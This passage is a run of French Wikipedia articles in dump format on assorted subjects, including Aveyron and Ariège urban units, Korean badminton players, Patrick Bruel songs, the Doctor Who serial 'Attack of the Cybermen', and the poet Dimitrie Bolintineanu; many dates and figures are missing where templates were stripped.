En 2010, selon l'Insee, l"'unité urbaine de Decazeville" est composée de cinq communes, toutes situées dans l'arrondissement de Villefranche-de-Rouergue, subdivision administrative du département de l'Aveyron.
Dans le nouveau zonage de 2020, le périmètre est identique.
En , avec , elle représente la unité urbaine du département de l'Aveyron et occupe le dans la région Occitanie.
En 2021, sa densité de population s'élève à . Par sa superficie, elle ne représente que 0,96 % du territoire départemental mais, par sa population, elle regroupe 4,9 % de la population du département de l'Aveyron.
Composition 2020 de l'unité urbaine.
Elle est composée des 5 communes suivantes :
Évolution démographique.
L'évolution démographique ci-dessous concerne l'unité urbaine selon le périmètre défini en 2020.

</doc>
<doc id="8978966" url="https://fr.wikipedia.org/wiki?curid=8978966" title="Yasin Haji">
Yasin Haji

Yasin Haji, né le , est un athlète éthiopien spécialiste du fond et du cross.
Ses meilleurs temps sont :
Il remporte le titre de champion du monde junior de cross 2015 à Guiyang.

</doc>
<doc id="8978967" url="https://fr.wikipedia.org/wiki?curid=8978967" title="Gil Young-ah">
Gil Young-ah

Gil Young-ah est une joueuse de badminton sud-coréenne née le .
Elle remporte une médaille de bronze olympique en double en 1992 à Barcelone avec Shim Eun-jung. Aux Jeux olympiques de 1996 à Atlanta, elle est sacrée championne olympique en double mixte avec Kim Dong-moon et médaillée d'argent en double féminin avec Jang Hye-ock.

</doc>
<doc id="8978970" url="https://fr.wikipedia.org/wiki?curid=8978970" title="Place des Grands Hommes">
Place des Grands Hommes

Place des Grands Hommes est une chanson interprétée par Patrick Bruel dont les paroles sont de Bruno Garcin et la musique de Patrick Bruel, parue sur l'album "Alors regarde" le , puis en single le en format vinyle et CD sous le label RCA.
Elle est le quatrième single de l'album après "Casser la voix", "J'te l'dis quand même" et "Alors regarde".
Description.
Elle évoque des retrouvailles entre une bande d'amis « place des Grands-Hommes », 10 ans après s'être vus pour la dernière fois, et les changements que chacun a connus. La place des Grands-Hommes ne fait pas référence à la place bordelaise du même nom, mais plutôt de manière imagée à la place du Panthéon à Paris, où sont accueillies les dépouilles des grands hommes et grandes femmes de la Nation. On peut d'ailleurs y accéder par la rue Soufflot, comme cela est mentionné dans la chanson.
Elle a été initialement écrite pour l'émission "Avis de recherche", où Patrick Bruel retrouvait ses camarades de classe plusieurs années plus tard comme dans la chanson.
Reprises et inspirations.
En 2005, .
En 2009, le ministère des Affaires étrangères et européennes édite une fiche pédagogique des chansons pour l'apprentissage de la langue et la connaissance des artistes francophones contemporains.
En 2014, dans sa chanson "Dans 10 ans", Guizmo s'inspire du refrain de "Place des Grands Hommes" qui est : , et qui devient : .

</doc>
<doc id="8978973" url="https://fr.wikipedia.org/wiki?curid=8978973" title="Street Genius">
Street Genius

Street Genius est une série documentaire diffusée sur National Geographic Channel depuis le . Dans le programme, Tim Shaw démontre les lois de la science avec des expériences dans la rue, avec des passants. Un QCM est proposé pour chaque expérience, d'après les réponses des participants, pour permettre au téléspectateur de participer.

</doc>
<doc id="8978975" url="https://fr.wikipedia.org/wiki?curid=8978975" title="Lee Dong-soo">
Lee Dong-soo

Lee Dong-soo est un joueur de badminton sud-coréen né le à Séoul.
Avec Yoo Yong-sung, il est médaillé d'argent en double masculin aux Jeux olympiques de 2000 à Sydney et aux Jeux olympiques d'été de 2004 à Athènes.

</doc>
<doc id="8978976" url="https://fr.wikipedia.org/wiki?curid=8978976" title="Embranchement de La Nouvelle">
Embranchement de La Nouvelle

L'embranchement de La Nouvelle est une branche latérale du canal du Midi constituée du canal de Jonction (), qui relie le canal du Midi à l'Aude, d'une courte section navigable sur l'Aude (), et du canal de la Robine () qui assure la communication avec Narbonne et Port-la-Nouvelle sur la Méditerranée.

</doc>
<doc id="8978984" url="https://fr.wikipedia.org/wiki?curid=8978984" title="Lit de semence">
Lit de semence

En agriculture, un lit de semence est la couche superficielle du sol plus ou moins finement travaillée pour recevoir les semences lors du semis et favoriser leur germination grâce à un bon contact entre les semences et le sol.
En jardinage ou en pépinière, le lit de semence s'insère dans un environnement local contrôlé constitué par exemple par un châssis froid spécialement préparé, une couche chaude ou une couche surélevée, dans lesquels on fait croître les plantules jusqu'à l'obtention des jeunes plants destinés à être transplantés dans un jardin ou dans un champ. Un lit de semence permet d'augmenter la proportion de graines qui germent.
Techniques.
Le sol d'un lit de semence doit être meuble et bien nivelé, sans grosses mottes. Ces caractéristiques sont nécessaires pour que les graines puissent être semées facilement et à une profondeur régulière pour une meilleure germination. De grosses mottes ou une surface inégale tendent à rendre plus aléatoire la profondeur de plantation. De nombreux types de plantules ont également besoin d'un sol meuble avec un minimum de cailloux pour mieux développer leurs racines (les carottes, par exemple, auront tendance à ne pas pousser droit dans des sols rocailleux).
La préparation du lit de semence dans les champs implique souvent un labour secondaire, à l'aide de herses et de cultivateurs. Ce travail peut succéder, le cas échéant, à un travail du sol primaire à l'aide de charrues ou de chisels (cultivateurs lourds). Les méthodes de culture sans labour évitent le labour tant pour la préparation du lit de semence qu'ensuite pour lutter contre les mauvaises herbes.
Dans les jardins, la préparation de lit de semence implique souvent un labour secondaire à l'aide d'outils à main tels que houes et râteaux. Cela peut suivre, le cas échéant, un travail du sol primaire à l'aide de bêches ou de pioches. Les motobineuses offrent une alternative motorisée qui assure à la fois le travail du sol primaire et secondaire.

</doc>
<doc id="8978985" url="https://fr.wikipedia.org/wiki?curid=8978985" title="Championnats d'Europe des régions de karaté 2011">
Championnats d'Europe des régions de karaté 2011



</doc>
<doc id="8978986" url="https://fr.wikipedia.org/wiki?curid=8978986" title="Jean-Claude Perrier">
Jean-Claude Perrier

 (né en 1957) est un écrivain et journaliste français.
Biographie.
Il naît le à l'hôpital Rothschild, dans le de Paris.
Ayant débuté au "Quotidien de Paris" en 1980, il collabore aujourd'hui au "Figaro littéraire", à "Livres-Hebdo", au "Magazine littéraire", à "L'Obs" et à "L'Orient-Le Jour".
Il dirige également, aux éditions du Cherche midi, la collection « Domaine indien ». Il est, enfin, membre du jury du prix Senghor du premier roman francophone et francophile.
En matière littéraire, ses inspirations sont notamment André Gide, Pierre Loti, André Malraux et Henri Michaux.
En 2013, candidat au fauteuil 2 de l'Académie française, laissé vacant par Hector Bianciotti, il recueille quatre voix contre treize à Dany Laferrière, trois à Catherine Clément et une à Arthur Pauly. En 2016, il réitère au fauteuil 5 de feue Assia Djebar, avant de retirer sa candidature quelques jours plus tard. Il est de nouveau candidat en 2021 au fauteuil de François Weyergans

</doc>
<doc id="8978989" url="https://fr.wikipedia.org/wiki?curid=8978989" title="Mont Canisy">
Mont Canisy



</doc>
<doc id="8978991" url="https://fr.wikipedia.org/wiki?curid=8978991" title="Yoo Yong-sung">
Yoo Yong-sung

Yoo Yong-sung est un joueur de badminton sud-coréen né le à Dangjin.
Avec Lee Dong-soo, il est médaillé d'argent en double masculin aux Jeux olympiques de 2000 à Sydney et aux Jeux olympiques d'été de 2004 à Athènes.

</doc>
<doc id="8978992" url="https://fr.wikipedia.org/wiki?curid=8978992" title="Luitpold de Babenberg">
Luitpold de Babenberg



</doc>
<doc id="8978993" url="https://fr.wikipedia.org/wiki?curid=8978993" title="Tony G">
Tony G



</doc>
<doc id="8978995" url="https://fr.wikipedia.org/wiki?curid=8978995" title="L'Intégrale de trois albums (Patof)">
L'Intégrale de trois albums (Patof)

L'Intégrale de trois albums – Patof chante Noël / Patof chez les esquimaux / Patof en Russie est une compilation de Patof, commercialisée en 2014.
Le clown Patof est interprété par Jacques Desrosiers.
Composition.
L'album réunit des chansons et des contes parus sur disques entre 1972 et 1975, à l'époque de la diffusion des séries télévisées québécoises pour enfants Le Cirque du Capitaine et Patofville.
Contrairement à ce qui est annoncé, le CD ne contient pas le contenu intégral des trois albums cités. Le conte Patof en Russie, qui a été divisé en deux parties (pistes 4 et 6), a été amputé d'un effet sonore (les applaudissements des lapins) et la chanson "Patof Blou" n'est pas présente dans son intégralité. De plus, le conte Patof chez les esquimaux a été amputé de sa brève introduction, et la chanson "Il est né le divin enfant" provenant de l'album Noël Noël Noël avec Patof a été modifiée afin de retirer un passage où le refrain et le couplet « Une étable est son logement » sont chantés simultanément pour recréer un effet utilisé dans les anciens cantiques.

</doc>
<doc id="8978996" url="https://fr.wikipedia.org/wiki?curid=8978996" title="Qui a le droit…">
Qui a le droit…

Qui a le droit… est une chanson composée et interprétée par Patrick Bruel, parue sur son deuxième album live "Si ce soir…", sorti en 2 volumes en 1991. L'album résume la tournée de "Alors regarde". 
La chanson est classée numéro un des ventes en France durant 7 semaines à partir du et est certifiée disque d'or.
"Qui a le droit…" est le single qui a porté l'album live dans le haut du top album.
"Qui a le droit…" a été ré-enregistré en duo en 2004 par Bruel et Ana Torroja (membre de Mecano) pour les albums "Puzzle" et la compilation "Duos". Bruel a également enregistré une reprise avec Zazie, Isabelle Boulay, Corneille, Garou et Jean-Baptiste Maunier. Le chœur d'enfants "Vox Angeli" a également fait une reprise de la chanson sur son album du même nom en 2008, avec succès.
Le clip vidéo a été tourné en version live : Bruel joue du piano et, pendant un moment, des dizaines de milliers de spectateurs interprètent la chanson à la place du chanteur. La chanson a été incluse dans les albums de Bruel "Plaza de los heroes" (1995), "Patrick Bruel" (2002), "S'laisser aimer" (triple best of, 2007) et "Live - Des souvenirs… ensemble" (2007). Le chanteur a notamment interprété "Qui a le droit…" en direct au Téléthon 2008 à Palladio.
En France, après ses débuts à la le , la chanson a été le premier single live à atteindre le sommet du classement des singles cinq semaines plus tard pour sept semaines consécutives.

</doc>
<doc id="8978997" url="https://fr.wikipedia.org/wiki?curid=8978997" title="Unité urbaine de Foix">
Unité urbaine de Foix

L'unité urbaine de Foix est une unité urbaine française centrée sur la commune de Foix, préfecture du département de l'Ariège en région Occitanie.
Données globales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée de six communes, toutes situées dans l'arrondissement de Foix, subdivision administrative du département de l'Ariège.
Dans le nouveau zonage réalisé en 2020, elle est composée de cinq communes. Deux communes comprises dans le zonage de 2010, Montgailhard et Saint-Paul-de-Jarrat, constituent maintenant l'unité urbaine de Montgailhard. Par contre, Vernajoul a ét ajoutée au périmètre.
En , avec , elle représente la unité urbaine du département de l'Ariège et occupe le dans la région Occitanie.
En 2021, sa densité de population s'élève à . Par sa superficie, elle ne représente que 1,11 % du territoire départemental mais, par sa population, elle regroupe 7,99 % de la population du département de l'Ariège.
Composition 2020 de l'unité urbaine.
Elle est composée des cinq communes suivantes :
Évolution démographique.
L'évolution démographique ci-dessous concerne l'unité urbaine selon le périmètre défini en 2020.

</doc>
<doc id="8978998" url="https://fr.wikipedia.org/wiki?curid=8978998" title="Ha Tae-kwon">
Ha Tae-kwon

Ha Tae-kwon est un joueur de badminton sud-coréen né le .
Avec Kim Dong-moon, il est médaillé de bronze en double hommes aux Jeux olympiques de 2000 à Sydney, puis champion olympique en double hommes aux Jeux olympiques d'été de 2004 à Athènes .

</doc>
<doc id="8979000" url="https://fr.wikipedia.org/wiki?curid=8979000" title="Charles Stevenson Wright">
Charles Stevenson Wright

Charles Stevenson Wright, né le à New Franklin dans le Missouri et mort le à New York, est un écrivain américain, auteur d'une trilogie romanesque dédiée à New York et à ses marges.

</doc>
<doc id="8979001" url="https://fr.wikipedia.org/wiki?curid=8979001" title="Tpop">
Tpop



</doc>
<doc id="8979004" url="https://fr.wikipedia.org/wiki?curid=8979004" title="Groupe volcanique septentrional de Yatsugatake">
Groupe volcanique septentrional de Yatsugatake

Le est un groupe volcanique de stratovolcans et de dômes de lave situé dans la préfecture de Nagano sur l'île de Honshū au Japon.

</doc>
<doc id="8979005" url="https://fr.wikipedia.org/wiki?curid=8979005" title="Moustier (Belgique)">
Moustier (Belgique)



</doc>
<doc id="8979007" url="https://fr.wikipedia.org/wiki?curid=8979007" title="Saad Al Shammari">
Saad Al Shammari

Saad Sattam Saud Al Shammari () (né le à Rafha en Arabie saoudite) est un joueur de football international qatarien, qui évolue au poste de défenseur.
Biographie.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 65 matchs (pour 6 buts inscrits) entre 2000 et 2010.
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2000, de 2004 et de 2007. Il atteint les quarts de finale de cette compétition en 2000.
Il joue également 21 matchs comptant pour les tours préliminaires de la coupe du monde, lors des éditions 2002, 2006 et .

</doc>
<doc id="8979009" url="https://fr.wikipedia.org/wiki?curid=8979009" title="Shim Eun-jung">
Shim Eun-jung

Shim Eun-jung est une joueuse de badminton sud-coréenne née le .
Elle remporte une médaille de bronze olympique en double en 1992 à Barcelone avec Gil Young-ah.

</doc>
<doc id="8979010" url="https://fr.wikipedia.org/wiki?curid=8979010" title="Attack of the Cybermen">
Attack of the Cybermen

 ("L'Attaque des Cybermans") est le cent-trente-septième épisode de la première série de la série télévisée britannique de science-fiction "Doctor Who". Originellement diffusé sur la chaîne BBC One en deux parties le 5 et le 12 janvier 1985, cet épisode débute la de la série.
Accroche.
Le Docteur découvre un étrange signal de détresse d'origine extra-terrestre venant de Londres en 1985. Enquêtant avec Peri, il se retrouve sur la piste de Cybermen venus du futur qui projettent de détruire la Terre afin d'empêcher la destruction de leur monde natal, Mondas. Il rencontre aussi un mercenaire qu'il a rencontré par le passé.
Résumé.
Alors que dans les égouts de Londres deux travailleurs sont attaqués par une force invisible, le Docteur tente de réparer le circuit caméléon de son TARDIS afin que son vaisseau prenne une autre forme que celle de la cabine de téléphone qu'il utilise habituellement. Ces changements provoquent des remous et le Docteur pose son vaisseau dans le Londres de l'année 1985 pendant que la Comète de Halley traverse le ciel. Le Docteur explique qu'il a entendu un signal de détresse venant d'un vaisseau extra-terrestre basé sur Terre. Celui-ci vient de l'ex-mercenaire Lytton, qui a travaillé autrefois pour les Daleks. Il amène plusieurs de ses collaborateurs dans les égouts leur faisant miroiter le moyen de voler des diamants conservés dans la Banque d'Angleterre. En réalité, celui-ci tente de prendre contact avec des Cybermen qui effectuent des opérations souterraines. Tandis que l'un de ses collaborateurs, Russell, réussit à s'enfuir, Lytton offre les autres aux Cybermen afin qu'ils puissent être convertis.
Ayant atterri dans une décharge, le Docteur poursuit sa recherche vers le signal de détresse tandis que le TARDIS prend la forme d'un orgue. À l'entrée des égouts, lui et Peri tombent sur des sbires policiers sous le contrôle de Lytton et réussissent à les neutraliser. Ils tombent sur Russell et celui-ci leur révèle qu'il est un policier chargé d'enquêter sur les agissements de Lytton. Pendant ce temps, sur Telos, la planète où se trouve le commandement des Cybermen, deux esclaves, Bates et Stratton parviennent à décapiter un Cyberman. Ils espèrent pouvoir se déguiser en lui afin d'atteindre le Cyber-Control où se trouve leur vaisseau permettant de voyager dans le temps. 
Alors que le Docteur, Peri et Russell reviennent au TARDIS, ils se retrouvent pris en embuscade par des Cybermen qui semblent avoir investi le vaisseau. Russell se fait tuer. Le Docteur menace d'auto-détruire son TARDIS à condition que l'on relâche Peri. Il est forcé d'emmener le TARDIS sur Telos dans le futur, tandis qu'il se retrouve enfermé avec Peri, Lytton et Griffiths, un de ses hommes de mains. Durant le voyage, ils parlent de Telos, une planète autrefois habitée par les Cryons qui fut colonisée par les Cybermen afin d'abriter les cocons de Cybermen cryogénisés. Le Docteur comprend que les Cybermen souhaitent la technologie de voyage dans le temps afin d'empêcher leur planète natale, Mondas, de s'écraser sur Terre.
Arrivés sur Telos, tous réussissent à s'enfuir. Poursuivis par les Cybermen, ils sont sauvés, chacun de leur côtés par les Cryons. Il s'avère que Lytton travaillait pour eux depuis le début en échange de cristaux, communs chez eux. Lui et Griffiths retrouvent la trace de Bates et Stratton tandis que le Docteur se retrouve en captivité avec Flast, la cheffe des Cryons. Le Docteur réalise que ceux-ci souhaitent détruire la Terre en 1986 afin d'empêcher l'expansion des Cybermen mais que le Docteur se trouve avoir été au centre de ce conflit autrefois (dans l'épisode « "The Tenth Planet." ») Le Docteur parvient à s'enfuir avec Flast, mais celle-ci est tuée par un Cyberman. Lytton et ses acolytes sont retrouvés par les Cybermen et capturés afin d'être convertis en Cybermen. 
Le Docteur réussi à récupérer le TARDIS et apprend des Cryons que Lytton travaillait pour eux. Lytton, en état intermédiaire de conversion parvient à détruire le Controller des Cybermen avant de mourir à son tour. Le Docteur et Peri parviennent à s'enfuir dans un TARDIS ayant repris la forme d'une cabine de police, tandis que les installations de la planète Telos explosent. 
Production.
Écriture.
Le succès du retour des Cybermen dans l'épisode « "Earthshock" » en 1982 a poussé la production de la série à les mettre en scène dans l'épisode d'ouverture de la vingt-deuxième saison de la série. Le script-éditor (responsable des scénarios) Eric Saward souhaite un temps scénariser cet épisode mais est obligé de se rétracter au profit de « "Revelation of the Daleks" » et se tourne vers Ian Levine. Celui-ci, alors D.J. et producteur de musique est un grand fan de la série. Ayant souvent eu accès aux archives, il est bien connu de la production pour être conseiller non officiel sur la continuité de la série. Désireux de s'inspirer des épisodes des années 1960, il entame en 1983 avec l'aide de Saward le brouillon de “Return To Telos” () un épisode ayant ses racines des épisodes « "The Tenth Planet" » et « "The Tomb of the Cybermen." »
Saward décide de rajouter dans l'épisode ses propres créations comme le mercenaire Lytton qui avait disparu à la fin de « "Resurrection of the Daleks" » ainsi que les Cryons, une race d'extra-terrestres ayant chacun leur propre personnalité. L'idée de réparer le circuit caméléon fut introduit par le producteur John Nathan-Turner à des fins promotionnelles, sachant que la presse parlerait de la série si le vaisseau du Docteur n'avait plus sa forme traditionnelle. Cette idée ne fut jamais développée plus loin que cet épisode.
Pour des raisons de droit avec la guilde des scénaristes, ni Eric Saward, ni Ian Levine n'avaient le droit de rédiger cet épisode et Saward se tourne vers une ancienne petite amie, une rédactrice nommée Paula Woolsey. Celle-ci l'avait aidé aussi pour l'écriture de l'épisode « "The Visitation" » et fut engagée le 10 janvier 1984 pour écrire le script de l'épisode alors intitulé “Cold War” () Son implication dans l'écriture du scénario est sujet à débat : selon Eric Saward elle a participé à l'écriture de l'épisode et à la trame globale, selon Ian Levine, l'épisode a été entièrement été écrit par Eric Saward sur la base de ses idées. Les deux parties furent commandées en format de 45 minutes afin de moderniser la série.
Au cours du printemps 1984, l'épisode est remanié une nouvelle fois avec la collaboration du réalisateur Matthew Robinson, afin de rendre la seconde partie beaucoup plus simple. À l'origine les Cryon vivaient à l'intérieur de la Comète de Halley et le but de Lytton était d'amener les Cybermen là bas pour qu'ils s'y retrouvent piégés. De plus, ayant appris qu'une partie des scènes sur Telos pourraient se passer à l'extérieur, Saward inclut les personnages de Stratton et Bates. Il accentue aussi le rôle du personnage de Griffiths. Afin de pallier le manque de personnage féminin, Robinson va décider de n'engager que des femmes pour les Cryons. L'épisode prend son titre final de "Attack Of The Cybermen" et le scénariste "officiel" de l'épisode est alors crédité sous le pseudonyme de "Paula Moore." 
Tournage.
Le réalisateur choisi à l'origine pour tourner l'épisode était Pennant Roberts, mais celui-ci s'est finalement fait remplacer par Matthew Robinson, un nouveau réalisateur qui avait déjà tourné "Resurrection of the Daleks" durant la saison précédente. C'est le dernier travail qu'il effectuera pour la série.
Le tournage débuta par les scènes en extérieurs, filmées le 29 mai 1984 dans différents lieux de Londres. La scène où le gang de Lytton reconnaît le marchand de diamant fut filmée à l'extérieur du Pub de Dartmouth Castle, tandis que son local est en réalité les bureaux de United International Pictures à Londres. La décharge dans laquelle se pose le TARDIS était une véritable décharge et la séquence où le Docteur retrace le signal fut tournée sur Davis Road. Les 30 et 31 mai eut lieu le tournage à la surface de Talos. Afin de maintenir une sorte de continuité avec "The Tomb of the Cybermen", il eut lieu dans la même carrière de sable, celle de Gerrards Cross Sand &amp; Ballast Company à Wapsey Wood dans le Buckinghamshire. Afin de montrer l'hostilité de la surface de Telos, les Cybermen devaient porter des combinaisons, mais celles-ci jugées trop ridicules, furent abandonnées. L'équipe revint à Londres le juin au Cameron Scrap Merchant qui servit de garage pour le gang de Lytton. Le tournage des maquettes fut complété les 7 et 8 juin au BBC Model Stage.
La première session de tournage eut lieu du 21 au 22 juin 1984 au studio 6 du centre télévisuel de la BBC et concernait les scènes dans la base terrienne des Cybermen, dans les égouts et le TARDIS. La seconde session de tournage eut lieu du 6 au 8 juillet pour les scènes se situant sur Telos. Ian Levine fut déçu du nouveau design des chambres dans lesquelles les Cybermen dorment.
Diffusion et Réception.
Afin de moderniser la série, les épisodes furent diffusées sous format de 45 minutes tous les samedis. C'est la première fois que la série changeait de format de longueur d'épisode sur une saison depuis sa naissance en 1963. Pour certaines rediffusions à l'étranger cet épisode a été redécoupé en quatre parties.
Critiques.
L'épisode fut l'un des premiers à être critiqué cette saison par les fans pour son utilisation de la violence. En 1985 le président du fan club australien de Doctor Who critiquera la façon dont est filmé la mort de Lytton par étranglement, estimant que c'est de la "violence gratuite." Dans "Doctor Who : The Television Companion" (1998) , la scène est aussi critiquée pour son côté gratuit et "inutilement méchant et gore." S'ils apprécient la direction de Matthew Robinson, il considère que l'histoire est "superficielle et ne passe pas l'examen d'un second visionnage" la qualifiant "d'une des histoires les moins originales de la série." Ils estiment qu'en cherchant à plaire au fan, les scénaristes n'ont fait que rendre l'histoire encore plus confuse. Dans le livre "Doctor Who : The Discontinuity Guide" (1995), Paul Cornell, Martin Day, et Keith Topping qualifient l'épisode comme étant la pire histoire mettant en scène les Cybermen et détruisant "The Tomb of the Cybermen." Ils critiquent aussi sa violence.
En 2012, Patrick Mulkern de "Radio Times" raconte avoir assisté au tournage d'une scène de l'épisode et parle des coulisses. Il note l'épisode 2 étoiles sur 5 et trouve que si Colin Baker s'en sort bien et reste très fun, il espère secrètement à chaque visionnage que Peri se fasse tuer, se désolant que Nicola Bryant soit filmée comme "un sac de viande." 
Novélisation.
L'épisode fut romancé par Eric Saward et publié en avril 1989 avec une couverture de Colin Howard. Il porte le numéro 138 de la collection Doctor Who des éditions Target Books. Ce roman n'a jamais connu de traduction à ce jour.
Éditions commerciales.
L'épisode n'a jamais été édité en français, mais a connu plusieurs éditions au Royaume-Uni et dans les pays anglophones.

</doc>
<doc id="8979011" url="https://fr.wikipedia.org/wiki?curid=8979011" title="Au Café des délices">
Au Café des délices

Au Café des délices est une chanson écrite par Félix Gray, composée et interprétée par Patrick Bruel, troisième single de son cinquième album "Juste avant" paru le . Elle raconte la douceur de vivre dans la ville de Tunis.
La chanson évoque la vie à Tunis (port, femmes, enfants, odeurs du jasmin), mais aussi les « soirées de fête » sur les plages d'Hammamet. Elle a une tonalité nostalgique, même si Bruel est originaire de Tlemcen en Algérie. Félix Gray, l’auteur du texte, est bien né à Tunis, lui.
Le refrain "Yalil, Yalil, Habibi Yalil !," est une expression fréquemment employée dans les chansons d'amour arabes. Elle signifie littéralement : "Oh Nuit , Oh Nuit, Mon Amour, Oh Nuit !".
À la suite du tournage, en 1999 à Sidi Bou Saïd, du clip de la chanson, le café de Sidi Chaabane a été rebaptisé café des Délices.

</doc>
<doc id="8979012" url="https://fr.wikipedia.org/wiki?curid=8979012" title="Au café des délices">
Au café des délices



</doc>
<doc id="8979014" url="https://fr.wikipedia.org/wiki?curid=8979014" title="Dimitrie Bolintineanu">
Dimitrie Bolintineanu

Dimitrie Bolintineanu est une figure de la renaissance culturelle roumaine, poète, romancier, homme politique et traducteur. Selon les sources, il est né en (ou en 1825 selon d'autres sources) à Bolintin din Vale, près de Bucarest. Son père, Enache Cosmades était un aroumain originaire de Macédoine.
Biographie.
Débuts littéraires.
Le , il débuta dans "Curierul de ambe sexe" [Le courrier des deux sexes], avec le poème "O fată tânără pe patul morții" [Une jeune fille sur le lit de mort], recommandé chaleureusement par Ion Heliade Rădulescu. En même temps qu'il collaborait à plusieurs revues, par exemple "Propășirea" [L'épanouissement], il poursuivit également une carrière administrative. Il adhéra à la société secrète Frația [La fraternité] aux côtés de Nicolae Bălcescu, Ion Ghica, Cezar Bolliac ou Christian Tell, ainsi qu'à la Societății literare [Société littéraire].
Intermède français.
Pour compléter sa formation, il partit étudier à Paris en 1846, suivant en particulier les cours du Collège de France. En 1847 parut son premier recueil de poésies, "Colecție din poeziile domnului D. Bolintineanu" [Collection de poésies de M. D. Bolintineanu]. Le , Nicolae Bălcescu réunit à Paris plusieurs amis, dont Bolintineanu : ils décidèrent de déclencher la Révolution.
Participation à la Révolution de 1848.
De retour en Roumanie, Bolintineanu prit une part active à la Révolution roumaine en tant que rédacteur de "Poporul Suveran" [Le peuple souverain]. Il fut arrêté avec les meneurs de la Révolution et transporté sur le Danube. Il réussit à s'évader et gagna Constantinople.
L'exil.
Les années suivantes, comme d'autres révolutionnaires roumains, il était réfugié à Paris. Il se consacra également à la rédaction de "Manoil", qui est souvent considéré comme le premier roman significatif roumain, et, à Constantinople, à celle de "Florile Bosforului" [Les fleurs du Bosphore]. Il voyagea beaucoup : Büyükada, Palestine, Égypte, Paris, Samos, Macédoine. Par la suite, il publia régulièrement des récits de voyage, comme en 1856. Il participa à la publication en français des "Principautés roumaines" (1854), aida à traduire en anglais des poèmes de Vasile Alecsandri ("Doine or the national Songs and Legends of Romania"), enfin "Manoil" fut édité en 1855.
Le retour au pays.
Après neuf années d'exil, Bolintineanu revint au pays en 1857, où il s'installa à Bucarest. En 1859, il accueillit avec enthousiasme l'élection du prince Couza. Les années suivantes, il fit partie de l'entourage du prince et occupa diverses fonctions officielles : commissaire dans la commission du Danube (1860), secrétaire d'état aux affaires étrangères (1861), ministre des Cultes et de l'Instruction publique (1863). En 1864, il démissionna du gouvernement et fut nommé membre du Conseil d’État. Cette période coïncide avec une intense activité littéraire qui vit, en plus de son activité de presse, la publication de poésies, récits de voyage, romans, écrits politiques, nouvelles historiques, traductions, dont on peut citer : "Elena", roman, en 1862 ou "Florile Bosforului" [Les fleurs du Bosphore] en 1866.
Les dernières années.
Bolintineanu a gardé de ses années d'exil des liens avec la France, où il était considéré comme un poète parnassien Il publia des poésies qu'il avait adaptées en français : "Brises d'Orient. Poésies roumaines".
Toujours aussi prolifique, il se lança même dans le théâtre. Ses dernières années restèrent néanmoins marquées par la maladie et les difficultés matérielles. Des personnalités comme Grigore Grandea ou Cezar Bolliac lancèrent des appels à aider le grand écrivain. En 1871, il fut interné à l'hôpital Pantelimon, "sans vêtements". Il est mort le et fut enterré à Bolintin din Vale.
Influence littéraire.
Mircea Cărtărescu lui rendit hommage en le pastichant dans son long poème "Le Levant", dont le héros se prénomme Manoil.
Andreia Roman résume efficacement sa postérité : plutôt que pour ses romans, il est aujourd'hui connu pour ses poésies patriotiques populaires, aux rythmes qu'on retient facilement.

</doc>
<doc id="8979015" url="https://fr.wikipedia.org/wiki?curid=8979015" title="Jang Hye-ock">
Jang Hye-ock

Jang Hye-ock est une joueuse de badminton sud-coréenne née le .
Avec Gil Young-ah, elle est sacrée championne du monde en double dames en 1995 et remporte une médaille d'argent olympique en double dames en 1996 à Atlanta.

</doc>
<doc id="8979019" url="https://fr.wikipedia.org/wiki?curid=8979019" title="Jacques-Charles-Gabriel Delahaye">
Jacques-Charles-Gabriel Delahaye

Jacques-Charles-Gabriel Delahaye, né le à Caudebec-en-Caux, mort le dans l'ancien arrondissement de Paris, est un homme politique de la Révolution française.
Biographie.
Sous la Convention.
Delahaye est avocat dans sa ville natale lorsqu'il est élu en septembre 1792 député du département de la Seine-Inférieure, le seizième et dernier, à la Convention nationale.
Il siège sur les bancs de la Gironde. Lors du procès de Louis XVI, il vote la détention durant la guerre et le bannissement à la paix et se prononce en faveur de l'appel au peuple et du sursis à l'exécution. Il vote en faveur de la mise en accusation de Marat et ne participe pas au scrutin sur le rétablissement de la Commission des Douze.
Delahaye abandonne son poste de député et se cache. Le premier suppléant de son département, Pierre Lecomte, le remplace le 25 juillet 1793. Delahaye est décrété d'accusation le 3 octobre 1793 sur motion d'Amar, au nom du Comité de Sûreté générale. Il se soustrait au décret et se place hors de la loi, risquant la guillotine s'il est retrouvé.
En germinal an III (avril 1795), sur motion de Merlin de Douai, au nom du Comité de Sûreté générale, il est blanchi des accusations de Lecointre selon lesquelles il aurait combattu aux côtés des chouans, et rappelé au sein de la Convention.
Sous le Directoire.
Delahaye est réélu député au Conseil des Cinq-Cents lors des élections de l'an IV (octobre 1795). En messidor an V, il est secrétaire sous la présidence de Larivière, ses collègues étant Villaret-Joyeuse, Jourdan « des Bouches-du-Rhône », et Aymé. Il est tiré au sort pour rester au Conseil jusqu'en prairial an VI (mai 1798). Au terme du coup d’État du 18 fructidor an V, il est compris dans le décret de bannissement en Guyane des députés aux accointances royalistes.

</doc>
<doc id="8979021" url="https://fr.wikipedia.org/wiki?curid=8979021" title="Championnats d'Europe des régions de karaté 2012">
Championnats d'Europe des régions de karaté 2012



</doc>
<doc id="8979024" url="https://fr.wikipedia.org/wiki?curid=8979024" title="Championnats d'Europe des régions de karaté 2013">
Championnats d'Europe des régions de karaté 2013



</doc>
<doc id="8979025" url="https://fr.wikipedia.org/wiki?curid=8979025" title="Bastet (région)">
Bastet (région)



</doc>
<doc id="8979026" url="https://fr.wikipedia.org/wiki?curid=8979026" title="Jalani Sidek">
Jalani Sidek

Jalani Sidek est un joueur de badminton malaisien né le .
Aux Jeux olympiques de 1992 à Barcelone, il est médaillé de bronze en double avec son frère Razif Sidek.
Il a aussi un autre frère Rashid qui a été médaillé olympique de badminton.

</doc>
<doc id="8979027" url="https://fr.wikipedia.org/wiki?curid=8979027" title="Johannes Willms">
Johannes Willms

Johannes Willms, né le à Wurtzbourg et mort le à Munich) est un historien et un journaliste allemand.
Biographie.
